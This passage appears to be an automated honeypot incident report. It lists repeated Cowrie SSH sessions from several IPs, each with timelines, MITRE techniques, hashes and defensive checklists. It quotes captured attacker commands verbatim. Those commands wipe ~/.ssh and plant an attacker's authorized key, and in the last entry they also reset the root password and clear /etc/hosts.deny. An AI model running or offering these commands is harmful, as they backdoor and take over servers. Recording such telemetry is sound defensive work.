|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:37 |
| **Last Seen** | 2026-04-20 21:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:37:44` | `cowrie.session.connect` |
| `2026-04-20 21:37:44` | `cowrie.client.version` |
| `2026-04-20 21:37:44` | `cowrie.client.kex` |
| `2026-04-20 21:37:45` | `cowrie.login.success` |
| `2026-04-20 21:37:45` | `cowrie.session.params` |
| `2026-04-20 21:37:45` | `cowrie.command.input` |
| `2026-04-20 21:37:45` | `cowrie.command.failed` |
| `2026-04-20 21:37:45` | `cowrie.log.closed` |
| `2026-04-20 21:37:46` | `cowrie.session.params` |
| `2026-04-20 21:37:46` | `cowrie.command.input` |
| `2026-04-20 21:37:46` | `cowrie.session.file_download` |
| `2026-04-20 21:37:46` | `cowrie.log.closed` |
| `2026-04-20 21:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-528eaa6188bd

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:37 |
| **Last Seen** | 2026-04-20 21:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:37:48` | `cowrie.session.connect` |
| `2026-04-20 21:37:48` | `cowrie.client.version` |
| `2026-04-20 21:37:48` | `cowrie.client.kex` |
| `2026-04-20 21:37:48` | `cowrie.login.success` |
| `2026-04-20 21:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f89eaeb204eb

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:37 |
| **Last Seen** | 2026-04-20 21:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:37:59` | `cowrie.session.connect` |
| `2026-04-20 21:37:59` | `cowrie.client.version` |
| `2026-04-20 21:37:59` | `cowrie.client.kex` |
| `2026-04-20 21:38:00` | `cowrie.login.success` |
| `2026-04-20 21:38:00` | `cowrie.session.params` |
| `2026-04-20 21:38:00` | `cowrie.command.input` |
| `2026-04-20 21:38:00` | `cowrie.command.failed` |
| `2026-04-20 21:38:01` | `cowrie.log.closed` |
| `2026-04-20 21:38:01` | `cowrie.session.params` |
| `2026-04-20 21:38:01` | `cowrie.command.input` |
| `2026-04-20 21:38:01` | `cowrie.session.file_download` |
| `2026-04-20 21:38:01` | `cowrie.log.closed` |
| `2026-04-20 21:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2faf373b19b6

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:38 |
| **Last Seen** | 2026-04-20 21:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:38:04` | `cowrie.session.connect` |
| `2026-04-20 21:38:04` | `cowrie.client.version` |
| `2026-04-20 21:38:04` | `cowrie.client.kex` |
| `2026-04-20 21:38:05` | `cowrie.login.success` |
| `2026-04-20 21:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82623d91d00d

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:39 |
| **Last Seen** | 2026-04-20 21:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:39:43` | `cowrie.session.connect` |
| `2026-04-20 21:39:43` | `cowrie.client.version` |
| `2026-04-20 21:39:44` | `cowrie.client.kex` |
| `2026-04-20 21:39:44` | `cowrie.login.success` |
| `2026-04-20 21:39:45` | `cowrie.session.params` |
| `2026-04-20 21:39:45` | `cowrie.command.input` |
| `2026-04-20 21:39:45` | `cowrie.command.failed` |
| `2026-04-20 21:39:45` | `cowrie.log.closed` |
| `2026-04-20 21:39:45` | `cowrie.session.params` |
| `2026-04-20 21:39:45` | `cowrie.command.input` |
| `2026-04-20 21:39:46` | `cowrie.session.file_download` |
| `2026-04-20 21:39:46` | `cowrie.log.closed` |
| `2026-04-20 21:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-868f4e39e1d5

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:39 |
| **Last Seen** | 2026-04-20 21:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:39:48` | `cowrie.session.connect` |
| `2026-04-20 21:39:48` | `cowrie.client.version` |
| `2026-04-20 21:39:48` | `cowrie.client.kex` |
| `2026-04-20 21:39:49` | `cowrie.login.success` |
| `2026-04-20 21:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5b3ca543a3

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:40 |
| **Last Seen** | 2026-04-20 21:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:40:29` | `cowrie.session.connect` |
| `2026-04-20 21:40:29` | `cowrie.client.version` |
| `2026-04-20 21:40:29` | `cowrie.client.kex` |
| `2026-04-20 21:40:30` | `cowrie.login.success` |
| `2026-04-20 21:40:30` | `cowrie.session.params` |
| `2026-04-20 21:40:30` | `cowrie.command.input` |
| `2026-04-20 21:40:30` | `cowrie.command.failed` |
| `2026-04-20 21:40:30` | `cowrie.log.closed` |
| `2026-04-20 21:40:31` | `cowrie.session.params` |
| `2026-04-20 21:40:31` | `cowrie.command.input` |
| `2026-04-20 21:40:31` | `cowrie.session.file_download` |
| `2026-04-20 21:40:31` | `cowrie.log.closed` |
| `2026-04-20 21:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44e9aac42858

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:40 |
| **Last Seen** | 2026-04-20 21:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:40:34` | `cowrie.session.connect` |
| `2026-04-20 21:40:34` | `cowrie.client.version` |
| `2026-04-20 21:40:34` | `cowrie.client.kex` |
| `2026-04-20 21:40:35` | `cowrie.login.success` |
| `2026-04-20 21:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b184e701804

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:42 |
| **Last Seen** | 2026-04-20 21:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:42:14` | `cowrie.session.connect` |
| `2026-04-20 21:42:14` | `cowrie.client.version` |
| `2026-04-20 21:42:14` | `cowrie.client.kex` |
| `2026-04-20 21:42:15` | `cowrie.login.success` |
| `2026-04-20 21:42:15` | `cowrie.session.params` |
| `2026-04-20 21:42:15` | `cowrie.command.input` |
| `2026-04-20 21:42:15` | `cowrie.command.failed` |
| `2026-04-20 21:42:15` | `cowrie.log.closed` |
| `2026-04-20 21:42:16` | `cowrie.session.params` |
| `2026-04-20 21:42:16` | `cowrie.command.input` |
| `2026-04-20 21:42:16` | `cowrie.session.file_download` |
| `2026-04-20 21:42:16` | `cowrie.log.closed` |
| `2026-04-20 21:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8f010cd0a83

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:42 |
| **Last Seen** | 2026-04-20 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:42:19` | `cowrie.session.connect` |
| `2026-04-20 21:42:19` | `cowrie.client.version` |
| `2026-04-20 21:42:20` | `cowrie.client.kex` |
| `2026-04-20 21:42:20` | `cowrie.login.success` |
| `2026-04-20 21:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90d71d2b14fc

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:43 |
| **Last Seen** | 2026-04-20 21:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:43:12` | `cowrie.session.connect` |
| `2026-04-20 21:43:12` | `cowrie.client.version` |
| `2026-04-20 21:43:13` | `cowrie.client.kex` |
| `2026-04-20 21:43:13` | `cowrie.login.success` |
| `2026-04-20 21:43:14` | `cowrie.session.params` |
| `2026-04-20 21:43:14` | `cowrie.command.input` |
| `2026-04-20 21:43:14` | `cowrie.command.failed` |
| `2026-04-20 21:43:14` | `cowrie.log.closed` |
| `2026-04-20 21:43:14` | `cowrie.session.params` |
| `2026-04-20 21:43:14` | `cowrie.command.input` |
| `2026-04-20 21:43:15` | `cowrie.session.file_download` |
| `2026-04-20 21:43:15` | `cowrie.log.closed` |
| `2026-04-20 21:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dae19638f17d

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:43 |
| **Last Seen** | 2026-04-20 21:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:43:17` | `cowrie.session.connect` |
| `2026-04-20 21:43:17` | `cowrie.client.version` |
| `2026-04-20 21:43:17` | `cowrie.client.kex` |
| `2026-04-20 21:43:18` | `cowrie.login.success` |
| `2026-04-20 21:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-168001921988

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:45 |
| **Last Seen** | 2026-04-20 21:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:45:01` | `cowrie.session.connect` |
| `2026-04-20 21:45:01` | `cowrie.client.version` |
| `2026-04-20 21:45:01` | `cowrie.client.kex` |
| `2026-04-20 21:45:02` | `cowrie.login.success` |
| `2026-04-20 21:45:02` | `cowrie.session.params` |
| `2026-04-20 21:45:02` | `cowrie.command.input` |
| `2026-04-20 21:45:02` | `cowrie.command.failed` |
| `2026-04-20 21:45:02` | `cowrie.log.closed` |
| `2026-04-20 21:45:03` | `cowrie.session.params` |
| `2026-04-20 21:45:03` | `cowrie.command.input` |
| `2026-04-20 21:45:03` | `cowrie.session.file_download` |
| `2026-04-20 21:45:03` | `cowrie.log.closed` |
| `2026-04-20 21:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2532a45cff

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:45 |
| **Last Seen** | 2026-04-20 21:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:45:06` | `cowrie.session.connect` |
| `2026-04-20 21:45:06` | `cowrie.client.version` |
| `2026-04-20 21:45:06` | `cowrie.client.kex` |
| `2026-04-20 21:45:06` | `cowrie.login.success` |
| `2026-04-20 21:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6abd117999ef

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 21:47 |
| **Last Seen** | 2026-04-20 21:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:47:35` | `cowrie.session.connect` |
| `2026-04-20 21:47:35` | `cowrie.client.version` |
| `2026-04-20 21:47:36` | `cowrie.client.kex` |
| `2026-04-20 21:47:37` | `cowrie.login.success` |
| `2026-04-20 21:47:38` | `cowrie.session.params` |
| `2026-04-20 21:47:38` | `cowrie.command.input` |
| `2026-04-20 21:47:38` | `cowrie.command.failed` |
| `2026-04-20 21:47:38` | `cowrie.log.closed` |
| `2026-04-20 21:47:39` | `cowrie.session.params` |
| `2026-04-20 21:47:39` | `cowrie.command.input` |
| `2026-04-20 21:47:39` | `cowrie.session.file_download` |
| `2026-04-20 21:47:39` | `cowrie.log.closed` |
| `2026-04-20 21:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72622ff298bd

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 21:47 |
| **Last Seen** | 2026-04-20 21:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:47:43` | `cowrie.session.connect` |
| `2026-04-20 21:47:43` | `cowrie.client.version` |
| `2026-04-20 21:47:43` | `cowrie.client.kex` |
| `2026-04-20 21:47:44` | `cowrie.login.success` |
| `2026-04-20 21:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76e83bce8ab

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-20 21:48 |
| **Last Seen** | 2026-04-20 21:48 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gm2LUCSt2pjp"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
